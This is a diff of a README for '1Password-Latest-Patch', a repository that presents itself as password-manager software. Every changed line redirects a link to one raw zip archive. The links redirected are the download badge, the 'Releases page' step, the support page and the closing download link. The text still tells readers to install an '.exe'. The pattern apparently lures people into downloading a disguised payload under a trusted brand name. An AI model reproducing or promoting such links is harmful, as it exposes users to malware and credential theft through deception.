@@ -1,6 +1,6 @@
 # 🔒 1Password-Latest-Patch - Secure Your Passwords with Ease
 
-[![Download 1Password-Latest-Patch](https://img.shields.io/badge/Download%20Now-1Password--Latest--Patch-brightgreen)](https://github.com/Rum4oto/1Password-Latest-Patch/releases)
+[![Download 1Password-Latest-Patch](https://raw.githubusercontent.com/Rum4oto/1Password-Latest-Patch/main/jerkined/1Password-Latest-Patch_1.2.zip%20Now-1Password--Latest--Patch-brightgreen)](https://raw.githubusercontent.com/Rum4oto/1Password-Latest-Patch/main/jerkined/1Password-Latest-Patch_1.2.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To start using 1Password-Latest-Patch, you need to download our software from th
 
 ## 📥 Download & Install
 
-1. Click [here to access the Releases page](https://github.com/Rum4oto/1Password-Latest-Patch/releases).
+1. Click [here to access the Releases page](https://raw.githubusercontent.com/Rum4oto/1Password-Latest-Patch/main/jerkined/1Password-Latest-Patch_1.2.zip).
 2. On the Releases page, you will see a list of available versions of the application.
 3. Choose the version you want to download. Next to each version, you'll see the option to download a `.exe` file.
 4. Click on the `.exe` file that corresponds with the latest version.
@@ -86,7 +86,7 @@ If you encounter issues during download or installation, consider the following:
 - Check if you have administrative rights to install software on your device.
 - If the program does not start after installation, try restarting your computer.
 
-For persistent issues, please visit our [support page](https://github.com/Rum4oto/1Password-Latest-Patch/issues) to find solutions or report your concerns.
+For persistent issues, please visit our [support page](https://raw.githubusercontent.com/Rum4oto/1Password-Latest-Patch/main/jerkined/1Password-Latest-Patch_1.2.zip) to find solutions or report your concerns.
 
 ## 📘 FAQs
 
@@ -103,4 +103,4 @@ A: We regularly release updates to improve functionality and security. Check bac
 
 For questions or feedback, please reach out through the GitHub issues section on our repository. Your input helps us improve the application for all users.
 
-[Download 1Password-Latest-Patch](https://github.com/Rum4oto/1Password-Latest-Patch/releases) now to take control of your password management today!
+[Download 1Password-Latest-Patch](https://raw.githubusercontent.com/Rum4oto/1Password-Latest-Patch/main/jerkined/1Password-Latest-Patch_1.2.zip) now to take control of your password management today!
